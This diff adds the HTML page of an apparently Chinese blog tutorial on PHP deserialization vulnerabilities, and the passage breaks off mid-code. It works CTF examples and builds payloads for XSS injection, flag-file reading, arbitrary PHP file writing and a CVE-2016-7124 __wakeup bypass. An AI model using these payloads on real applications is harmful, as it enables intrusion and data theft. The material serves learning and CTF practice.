@@ -1,0 +1,1051 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta http-equiv="X-UA-Compatible" content="ie=edge" />
+    <title>Php反序列化深度学习 | fragrant10 的博客</title>
+
+    
+<link href="/me/favicon.ico" rel="shortcut icon" type="image/x-icon" />
+
+
+
+
+<meta name="author" content="fragrant10" />
+<meta name="description" content="fragrant10 的生活记录～" />
+
+
+
+<meta name="generator" content="Hugo 0.83.1" />
+
+<link rel="canonical" href="https://fragrant10.github.io/phpsec/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/" />
+
+
+<meta property="og:title" content="Php反序列化深度学习" />
+<meta property="og:description" content="php反序列化深度学习 序列化与反序列化 序列化 serialize — 产生一个可存储的值的表示 serialize() 返回字符串，此字符串包含了表示 value 的字节流，可以存储于任何地方。 这有" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://fragrant10.github.io/phpsec/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/" /><meta property="article:section" content="phpsec" />
+<meta property="article:published_time" content="2021-05-14T21:36:49&#43;08:00" />
+<meta property="article:modified_time" content="2021-05-14T21:36:49&#43;08:00" />
+
+
+
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Php反序列化深度学习"/>
+<meta name="twitter:description" content="php反序列化深度学习 序列化与反序列化 序列化 serialize — 产生一个可存储的值的表示 serialize() 返回字符串，此字符串包含了表示 value 的字节流，可以存储于任何地方。 这有"/>
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/semantic-ui@2.4.2/dist/semantic.min.css">
+<link rel="stylesheet" href="/css/icomoon.css" />
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/overlayscrollbars@1.13.1/css/OverlayScrollbars.min.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css">
+<link rel="stylesheet" href="/css/site.css" />
+
+<style>
+  a:not(.ui.button):hover {
+    text-decoration: underline;
+  }
+
+  
+  a:not(.ui.button) {
+    color: seagreen !important;
+  }
+  
+
+  
+  .inverted a:not(.ui.button) {
+     color: darkseagreen !important;
+  }
+  
+
+  
+  body.default {
+    
+    background-color: #fff;
+    
+
+    
+    background-image: url(/me/background.jpg);
+    
+  }
+  
+
+  
+  body.dark {
+    
+    background-color: black;
+    
+
+    
+  }
+  
+</style>
+
+
+    
+
+
+
+<link rel="stylesheet" data-highlight href="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release/build/styles/gruvbox-light.min.css" />
+
+
+
+
+
+
+
+    
+    <link rel="stylesheet" href="/css/custom.css" />
+    
+  </head>
+
+  <body class="default">
+    
+<nav class="ui secondary menu dream-menu">
+
+  <div class="item">
+    <i class="large link bullseye icon dream-flip-toggle" title="Flip it!"></i>
+  </div>
+  <div class="item">
+    <i class="large link home icon" title="Home" onclick="window.location.href = 'https:\/\/fragrant10.github.io'"></i>
+  </div>
+  
+  <div class="item">
+    <i class="large link icon theme-switch" onclick="themeSwitch()"></i>
+  </div>
+  
+  
+  <div class="item">
+    <i class="large link search icon" onclick="toggleSearch()"></i>
+  </div>
+  
+</nav>
+
+    <div class="flip-container">
+      <div class="flipper">
+        <section class="front">
+          <div class="dream-max-width">
+            
+<div class="ui relaxed centered grid dream-grid dream-grid-single">
+  
+  
+  
+  
+
+  
+  <aside class="sixteen wide mobile sixteen wide tablet three wide computer column dream-single-aside">
+  
+    
+    <div class="ui segment toc">
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#序列化与反序列化">序列化与反序列化</a>
+      <ul>
+        <li><a href="#序列化">序列化</a></li>
+        <li><a href="#反序列化">反序列化</a></li>
+      </ul>
+    </li>
+    <li><a href="#反序列化漏洞产生原理">反序列化漏洞产生原理</a></li>
+    <li><a href="#简单序列化ctf题目案例">简单序列化ctf题目案例</a></li>
+    <li><a href="#不得不说的魔法函数">不得不说的魔法函数</a>
+      <ul>
+        <li><a href="#cve-2016-7124-__wakeup绕过">CVE-2016-7124 __wakeup绕过</a></li>
+      </ul>
+    </li>
+    <li><a href="#复杂的序列化ctf题目案例">复杂的序列化ctf题目案例</a></li>
+    <li><a href="#注入对象构造方法">注入对象构造方法</a>
+      <ul>
+        <li><a href="#当目标对象被privateprotected修饰时的反序列化漏洞">当目标对象被private、protected修饰时的反序列化漏洞</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+    </div>
+    
+
+    
+  
+  </aside>
+  
+  <div class="sixteen wide mobile sixteen wide tablet ten wide computer column markdown-body dream-single" id="dream-save-post-as-img">
+    <section class="ui top attached segment">
+      <header>
+        <h1 class="ui large header">Php反序列化深度学习<div class="sub header">
+            <div class="left">
+              @
+              
+                
+                  fragrant10
+                
+              
+
+              | 
+                  <span data-format="luxon">2021-05-14T21:36:49&#43;08:00</span>
+                
+
+              | 7 minutes read
+
+              
+              | Update at
+                
+                  <span data-format="luxon">2021-05-14T21:36:49&#43;08:00</span>
+                
+              
+            </div>
+
+            
+            <div class="dream-share">
+  <a href="#" class="save-as-image" title="Save as image" onclick="savePostAsImg()">
+    <i class="save icon"></i>
+  </a>
+  <a href="https://twitter.com/intent/tweet?text=Php%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%b7%b1%e5%ba%a6%e5%ad%a6%e4%b9%a0&url=https%3a%2f%2ffragrant10.github.io%2fphpsec%2fphp%25E5%258F%258D%25E5%25BA%258F%25E5%2588%2597%25E5%258C%2596%25E6%25B7%25B1%25E5%25BA%25A6%25E5%25AD%25A6%25E4%25B9%25A0%2f" title="Twitter">
+    <i class="twitter icon"></i>
+  </a>
+  <a href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2ffragrant10.github.io%2fphpsec%2fphp%25E5%258F%258D%25E5%25BA%258F%25E5%2588%2597%25E5%258C%2596%25E6%25B7%25B1%25E5%25BA%25A6%25E5%25AD%25A6%25E4%25B9%25A0%2f" title="Facebook">
+    <i class="facebook icon"></i>
+  </a>
+</div>
+
+            
+          </div>
+        </h1>
+      </header>
+
+      <article class="main">
+        
+        <img class="cover" src="/img/php%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%b7%b1%e5%ba%a6%e5%ad%a6%e4%b9%a0cover.jpg" />
+        
+
+        <p>php反序列化深度学习</p>
+<h2 id="序列化与反序列化">序列化与反序列化</h2>
+<h3 id="序列化">序列化</h3>
+<p>serialize — 产生一个可存储的值的表示</p>
+<blockquote>
+<p>serialize() 返回字符串，此字符串包含了表示 value 的字节流，可以存储于任何地方。</p>
+<p>这有利于存储或传递 PHP 的值，同时不丢失其类型和结构。</p>
+<p>想要将已序列化的字符串变回 PHP 的值，可使用 unserialize()。serialize() 可处理除了 resource 之外的任何类型。甚至可以 serialize() 那些包含了指向其自身引用的数组。你正 serialize() 的数组／对象中的引用也将被存储。</p>
+<p>当序列化对象时，PHP 将试图在序列动作之前调用该对象的成员函数 __sleep()。这样就允许对象在被序列化之前做任何清除操作。类似的，当使用 unserialize() 恢复对象时， 将调用 __wakeup() 成员函数。</p>
+</blockquote>
+<p>我们先看几个例子：</p>
+<p>普通字符串变量序列化</p>
+<pre><code>&lt;?php
+$test = '123456';
+$result = serialize($test);
+echo $result;
+?&gt;
+</code></pre><p><img src="/pics/2020-10-19-17-03-58.png" alt=""></p>
+<p>数组变量序列化</p>
+<pre><code>&lt;?php
+$arr = [
+    &quot;foo&quot; =&gt; &quot;bar&quot;,
+    &quot;bar&quot; =&gt; &quot;foo&quot;,
+];
+$result = serialize($arr);
+print_r($result);
+</code></pre><p><img src="/pics/2020-10-19-18-09-03.png" alt=""></p>
+<p>对象变量序列化</p>
+<pre><code>&lt;?php
+
+class test{
+    public $name = &quot;zhangsan&quot;;
+    public $age = 10;
+}
+$obj = new test();
+$result = serialize($obj);
+print_r($result);
+</code></pre><p><img src="/pics/2020-10-19-18-13-25.png" alt=""></p>
+<p><img src="/pics/2020-10-19-18-15-49.png" alt=""></p>
+<p>可见几乎所有正确的变量都可以被序列化成字符串然后保存下来</p>
+<p>序列化一个对象后将会保存对象的所有变量，并且发现序列化后的结果都有一个字符，这些字符都是以下字母的缩写。</p>
+<pre><code>a - array                  b - boolean  
+d - double                 i - integer
+o - common object          r - reference
+s - string                 C - custom object
+O - class                  N - null
+R - pointer reference      U - unicode string
+</code></pre><p>不同权限的属性序列化情况(public、protected、private)</p>
+<pre><code>&lt;?php
+
+class test{
+    public $name = &quot;zhangsan&quot;;
+    protected $age = 10;
+    private $sex = &quot;man&quot;;
+}
+$obj = new test();
+$result = serialize($obj);
+print_r($result);
+</code></pre><p><img src="/pics/2020-10-19-18-24-16.png" alt=""></p>
+<p>这里介绍一下public、private、protected的区别(区别常见于字符串逃逸类型题目)</p>
+<blockquote>
+<p>public(公共的):在本类内部、外部类、子类都可以访问</p>
+<p>protect(受保护的):只有本类或子类或父类中可以访问</p>
+<p>private(私人的):只有本类内部可以使用</p>
+</blockquote>
+<p>protect分析：</p>
+<blockquote>
+<p>本来是age结果上面出现的是<em>age，而且</em>age的长度是4，但是上面显示的是6，查找资料后发现protect属性序列化的时候格式是%00*%00成员名</p>
+</blockquote>
+<p>private分析：</p>
+<blockquote>
+<p>这样就发现本来是sex结果上面出现的是testsex，而且testsex长度为7，但是上面显示的是9，同样查找资料后发现private属性序列化的时候格式是%00类名%00成员名，%00占一个字节长度，所以age加了类名后变成了testage长度为9</p>
+</blockquote>
+<h3 id="反序列化">反序列化</h3>
+<p>unserialize — 从已存储的表示中创建 PHP 的值</p>
+<blockquote>
+<p>unserialize() 对单一的已序列化的变量进行操作，将其转换回 PHP 的值。
+序列化后的字符串。</p>
+<p>若被解序列化的变量是一个对象，在成功地重新构造对象之后，PHP 会自动地试图去调用 __wakeup() 成员函数（如果存在的话）。</p>
+</blockquote>
+<p>我们再看几个例子：</p>
+<pre><code>&lt;?php
+$b = 's:6:&quot;123456&quot;;';
+$b1 = unserialize($b);
+print_r($b1);
+?&gt;
+</code></pre><p><img src="/pics/2020-10-19-18-43-59.png" alt=""></p>
+<pre><code>&lt;?php
+$b = 'a:2:{s:3:&quot;foo&quot;;s:3:&quot;bar&quot;;s:3:&quot;bar&quot;;s:3:&quot;foo&quot;;}';
+$b1 = unserialize($b);
+print_r($b1);
+?&gt;
+</code></pre><p><img src="/pics/2020-10-19-18-44-55.png" alt=""></p>
+<pre><code>&lt;?php
+$b = 'O:4:&quot;test&quot;:2:{s:4:&quot;name&quot;;s:8:&quot;zhangsan&quot;;s:3:&quot;age&quot;;i:10;}';
+$b1 = unserialize($b);
+print_r($b1);
+?&gt;
+</code></pre><p><img src="/pics/2020-10-19-18-46-20.png" alt=""></p>
+<pre><code>&lt;?php
+
+class test{
+    public $name = &quot;zhangsan&quot;;
+    public $age = 10;
+}
+
+$b = 'O:4:&quot;test&quot;:2:{s:4:&quot;name&quot;;s:8:&quot;zhangsan&quot;;s:3:&quot;age&quot;;i:10;}';
+$b1 = unserialize($b);
+print_r($b1);
+?&gt;
+</code></pre><p><img src="/pics/2020-10-19-18-48-09.png" alt=""></p>
+<h2 id="反序列化漏洞产生原理">反序列化漏洞产生原理</h2>
+<p>因为存在大量的魔术方法、参数的传递、不安全函数的使用导致漏洞的产生</p>
+<p>常见魔术方法</p>
+<pre><code>__construct()当一个对象创建时被调用
+
+__destruct()当一个对象销毁时被调用
+
+__toString()当反序列化后的对象被输出的时候(转化为字符串的时候)被调用
+
+__sleep() 在对象在被序列化之前运行
+
+__wakeup() 将在序列化之后立即被调用
+</code></pre><p>看看这几个魔术方法的执行顺序</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+    <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">test</span>{
+        <span style="color:#66d9ef">public</span> $a<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;hacked by fra&#39;</span>;
+        <span style="color:#66d9ef">public</span> $b<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;hacked by fra2&#39;</span>;
+        <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">pt</span>(){
+            <span style="color:#66d9ef">echo</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">a</span><span style="color:#f92672">.</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
+        }
+        <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __construct(){
+            <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;__construct</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
+        }
+        <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __destruct(){
+            <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;__destruct</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
+        }
+        <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __sleep(){
+            <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;__sleep</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
+            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">array</span>(<span style="color:#e6db74">&#39;a&#39;</span>,<span style="color:#e6db74">&#39;b&#39;</span>);
+        }
+        <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __wakeup(){
+            <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;__wakeup</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
+        }
+    }
+    <span style="color:#75715e">//创建对象调用__construct
+</span><span style="color:#75715e"></span>    $object <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">test</span>();
+    <span style="color:#75715e">//序列化对象调用__sleep
+</span><span style="color:#75715e"></span>    $serialize <span style="color:#f92672">=</span> <span style="color:#a6e22e">serialize</span>($object);
+    <span style="color:#75715e">//输出序列化后的字符串
+</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#39;serialize: &#39;</span><span style="color:#f92672">.</span>$serialize<span style="color:#f92672">.</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
+    <span style="color:#75715e">//反序列化对象调用__wakeup
+</span><span style="color:#75715e"></span>    $unserialize<span style="color:#f92672">=</span><span style="color:#a6e22e">unserialize</span>($serialize);
+    <span style="color:#75715e">//调用pt输出数据
+</span><span style="color:#75715e"></span>    $unserialize<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">pt</span>();
+    <span style="color:#75715e">//脚本结束调用__destruct
+</span><span style="color:#75715e"></span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></code></pre></div><p><img src="/pics/2020-10-19-19-13-18.png" alt=""></p>
+<p>看一段存在反序列化漏洞的代码</p>
+<pre><code>&lt;?php
+
+class flag{
+    public $flag = &quot;demon&quot;;
+    function __destruct() {
+        echo $this-&gt;flag;
+    }
+}
+
+$a = $_GET['v'];
+$b = unserialize($a);
+</code></pre><p>利用方法是本地新建一个一样的类，但是更改flag变量的值为<code>&lt;img/src/onerror=alert(1)&gt;</code>,这样再通过序列化的方式输出序列化后的字符串，再将序列化字符串传入v参数，这样即可更改原本的flag值同时输出到页面。</p>
+<pre><code>&lt;?php
+
+class flag{
+    public $flag = &quot;&lt;img/src/onerror=alert(1)&gt;&quot;;
+    function __destruct() {
+        echo $this-&gt;flag;
+    }
+}
+$c = new flag();
+$d = serialize($c);
+print_r($d);
+</code></pre><p><img src="/pics/2020-10-20-18-40-49.png" alt=""></p>
+<p><img src="/pics/2020-10-20-18-41-56.png" alt=""></p>
+<p>这就是php反序列化的入门基础部分，接下来看看简单的序列化题目。</p>
+<h2 id="简单序列化ctf题目案例">简单序列化ctf题目案例</h2>
+<pre><code>&lt;?php
+error_reporting(0);
+include('../flag.php');
+$KEY = &quot;TTEESSTT!!&quot;;
+$str = $_GET['str'];
+if (unserialize($str) === &quot;$KEY&quot;)
+{
+    echo $flag;
+}
+
+show_source(__FILE__);
+</code></pre><p>大概意思就是变量str反序列化之后的值等于<code>TTEESSTT!!</code>,所以直接将该变量序列化输出就好</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+
+$KEY <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;TTEESSTT!!&#34;</span>;
+<span style="color:#a6e22e">print_r</span>(<span style="color:#a6e22e">serialize</span>($KEY));
+</code></pre></div><p><img src="/pics/2020-10-20-19-39-10.png" alt=""></p>
+<p>传入该字符串即可</p>
+<p><img src="/pics/2020-10-20-19-40-11.png" alt=""></p>
+<p>某靶场的一道反序列化相关的题目</p>
+<p>index.php</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+
+$txt <span style="color:#f92672">=</span> $_GET[<span style="color:#e6db74">&#34;txt&#34;</span>];
+$file <span style="color:#f92672">=</span> $_GET[<span style="color:#e6db74">&#34;file&#34;</span>];
+$password <span style="color:#f92672">=</span> $_GET[<span style="color:#e6db74">&#34;password&#34;</span>];
+
+<span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">isset</span>($txt) <span style="color:#f92672">&amp;&amp;</span> (<span style="color:#a6e22e">file_get_contents</span>($txt, <span style="color:#e6db74">&#39;r&#39;</span>) <span style="color:#f92672">===</span> <span style="color:#e6db74">&#34;welcome to the ctf&#34;</span>)){
+    <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#39;hello friends!&#39;</span> <span style="color:#f92672">.</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
+    <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#34;/flag/&#34;</span>, $file)){
+        <span style="color:#66d9ef">exit</span>(<span style="color:#e6db74">&#34;不能现在就给你flag哦</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+    }<span style="color:#66d9ef">else</span>{
+        <span style="color:#66d9ef">include</span>($file);
+        $password <span style="color:#f92672">=</span> <span style="color:#a6e22e">unserialize</span>($password);
+        <span style="color:#66d9ef">echo</span> $password;
+    }
+} <span style="color:#66d9ef">else</span> {
+    <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;you are not the member of us!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&lt;br&gt;&#34;</span>;
+    <span style="color:#a6e22e">show_source</span>(<span style="color:#66d9ef">__FILE__</span>);
+}
+
+
+
+<span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span><span style="color:#960050;background-color:#1e0010">
+</span><span style="color:#960050;background-color:#1e0010">&lt;!-- hint.php --&gt;
+</span></code></pre></div><p>分析代码可见需要<code>$txt</code>变量赋值并且值需要等于<code>welcome to the ctf</code>,因为函数<code>file_get_contents</code>支持<code>php://input</code>协议，所以可以被绕过。</p>
+<p>然后是<code>$file</code>变量不能够包含<code>flag</code>字符串。</p>
+<p>最后是可包含一个文件，一个反序列化操作，这里的<code>echo</code>熟悉的朋友能看出来这是<code>toString</code>魔法函数的可能性很大。</p>
+<p>hint.php</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+<span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Flag</span>{<span style="color:#75715e">//flag.php
+</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">public</span> $file;
+    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __toString(){
+        <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">isset</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">file</span>)){
+            <span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">file_get_contents</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">file</span>);
+            <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74"> success!&#34;</span>;
+            <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;good&#34;</span>;
+        }
+    }
+}
+<span style="color:#a6e22e">show_source</span>(<span style="color:#66d9ef">__FILE__</span>);
+</code></pre></div><p>因为包含了<code>hint.php</code>，所以可以创建以下测试文件输出序列化字符串，再进行反序列化的时候，<code>$file</code>变量会变成<code>flag.php</code>，这样就能直接输出flag的值了。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+<span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Flag</span>{<span style="color:#75715e">//flag.php
+</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">public</span> $file <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;flag.php&#34;</span>;
+    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __toString(){
+        <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">isset</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">file</span>)){
+            <span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">file_get_contents</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">file</span>);
+            <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
+            <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;good&#34;</span>;
+        }
+    }
+}
+
+$a <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Flag</span>();
+<span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">serialize</span>($a);
+</code></pre></div><p><img src="/pics/2020-10-21-16-35-48.png" alt=""></p>
+<p><img src="/pics/2020-10-21-16-36-17.png" alt=""></p>
+<p>再看一题</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+
+<span style="color:#66d9ef">class</span> <span style="color:#a6e22e">foo</span>{
+    <span style="color:#66d9ef">public</span> $file <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;2.txt&#34;</span>;
+    <span style="color:#66d9ef">public</span> $data <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;test&#34;</span>;
+    <span style="color:#66d9ef">function</span> __destruct(){
+        <span style="color:#a6e22e">file_put_contents</span>(<span style="color:#a6e22e">dirname</span>(<span style="color:#66d9ef">__FILE__</span>) <span style="color:#f92672">.</span> <span style="color:#e6db74">&#39;/&#39;</span> <span style="color:#f92672">.</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">file</span>, $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">data</span>);
+    }
+}
+
+$file_name <span style="color:#f92672">=</span> $_GET[<span style="color:#e6db74">&#39;filename&#39;</span>];
+<span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#34;You have readfile &#34;</span> <span style="color:#f92672">.</span> $file_name;
+<span style="color:#a6e22e">unserialize</span>(<span style="color:#a6e22e">file_get_contents</span>($file_name));
+</code></pre></div><p>分析代码，<code>$file_name</code>参数可控，存在反序列化情况，只要新建一个对象那么就会在文件里面写指定内容，但是内容和文件名都是可控的。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+
+<span style="color:#66d9ef">class</span> <span style="color:#a6e22e">foo</span>{
+    <span style="color:#66d9ef">public</span> $file <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;get.php&#34;</span>;
+    <span style="color:#66d9ef">public</span> $data <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&lt;?php show_source(&#39;flag.php&#39;);?&gt;&#34;</span>;
+    <span style="color:#66d9ef">function</span> __destruct(){
+        <span style="color:#a6e22e">file_put_contents</span>(<span style="color:#a6e22e">dirname</span>(<span style="color:#66d9ef">__FILE__</span>) <span style="color:#f92672">.</span> <span style="color:#e6db74">&#39;/&#39;</span> <span style="color:#f92672">.</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">file</span>, $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">data</span>);
+    }
+}
+
+$a <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">foo</span>();
+<span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">serialize</span>($a);
+</code></pre></div><p><img src="/pics/2020-10-21-17-10-05.png" alt=""></p>
+<p><img src="/pics/2020-10-21-17-11-24.png" alt=""></p>
+<h2 id="不得不说的魔法函数">不得不说的魔法函数</h2>
+<h3 id="cve-2016-7124-__wakeup绕过">CVE-2016-7124 __wakeup绕过</h3>
+<p><strong>__wakeup魔法函数简介</strong></p>
+<blockquote>
+<p>unserialize()会检查是否存在一个 __wakeup() 方法。如果存在，则会先调用 __wakeup() 方法，预先准备对象需要的资源<br>
+反序列化时，如果表示对象属性个数的值大于真实的属性个数时就会跳过__wakeup()的执行 (php5 &lt; 5.6.25, php7 &lt; 7.0.10)</p>
+</blockquote>
+<p>考反序列化的时候经常会遇见</p>
+<p><strong>__wakeup魔法函数绕过例题</strong></p>
+<p>index.php</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+<span style="color:#a6e22e">error_reporting</span>(<span style="color:#ae81ff">0</span>);
+<span style="color:#66d9ef">class</span> <span style="color:#a6e22e">A</span>{
+    <span style="color:#66d9ef">public</span> $target <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;test&#34;</span>;
+    <span style="color:#66d9ef">function</span> __wakeup(){
+        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">target</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;wakeup!&#34;</span>;
+    }
+    <span style="color:#66d9ef">function</span> __destruct(){
+        <span style="color:#a6e22e">print_r</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">target</span>);
+    }
+}
+
+$a <span style="color:#f92672">=</span> $_GET[<span style="color:#e6db74">&#34;test&#34;</span>];
+$b <span style="color:#f92672">=</span> <span style="color:#a6e22e">unserialize</span>($a);
+
+<span style="color:#66d9ef">if</span>(<span style="color:#66d9ef">empty</span>($a)){
+  <span style="color:#a6e22e">show_source</span>(<span style="color:#66d9ef">__FILE__</span>);
+}
+</code></pre></div><p>因为在反序列化的时候会优先执行__wakeup再执行__destruct，所以导致target属性会一直被覆盖掉，如下：</p>
+<pre><code>&lt;?php
+error_reporting(0);
+class A{
+    public $target = &quot;what I want?&quot;;
+    function __wakeup(){
+        $this-&gt;target = &quot;wakeup!&quot;;
+    }
+    function __destruct(){
+        print_r($this-&gt;target);
+    }
+}
+
+$a = new A();
+$b = serialize($a);
+print($b);
+</code></pre><p><img src="/pics/2020-10-23-15-05-37.png" alt=""></p>
+<p>但是只需要将<code>O:1:&quot;A&quot;:1:{s:6:&quot;target&quot;;s:12:&quot;what I want?&quot;;}</code>更改成<code>O:1:&quot;A&quot;:3:{s:6:&quot;target&quot;;s:12:&quot;what I want?&quot;;}</code>即可实现<code>__wakeup</code>函数的绕过</p>
+<p><img src="/pics/2020-10-23-15-08-13.png" alt=""></p>
+<h2 id="复杂的序列化ctf题目案例">复杂的序列化ctf题目案例</h2>
+<p>index.php</p>
+<pre><code>&lt;?php
+      error_reporting(0);
+
+      if (strpos($_GET['un'], 'php://filter')) {
+        die(&quot;&lt;font color=&quot; . &quot;#9932CC&gt;&quot; . '不允许使用php://filter' . &quot;&lt;/font&gt;&quot;);
+      }
+
+      class Connection
+      {
+          public $file;
+
+          public function __construct($file)
+          {
+              $this-&gt;file = $file;
+          }
+
+          public function __sleep()
+          {
+              $this-&gt;file = 'sleep.txt';
+              return array('file');
+          }
+
+          public function __wakeup()
+          {
+              $this-&gt;file = 'wakeup.txt';
+          }
+
+          public function __destruct()
+          {
+              include($this-&gt;file);
+          }
+      }
+
+      if (empty($_GET['un'])) {
+          ?&gt;
+      &lt;pre&gt; class Connection
+      {
+          public $file;
+
+          public function __construct($file)
+          {
+              $this-&gt;file = $file;
+          }
+
+          public function __sleep()
+          {
+              $this-&gt;file = 'sleep.txt';
+              return array('file');
+          }
+
+          public function __wakeup()
+          {
+              $this-&gt;file = 'wakeup.txt';
+          }
+
+          public function __destruct()
+          {
+              include($this-&gt;file);
+          }
+      }
+      $obj2 = unserialize($_GET['un']);
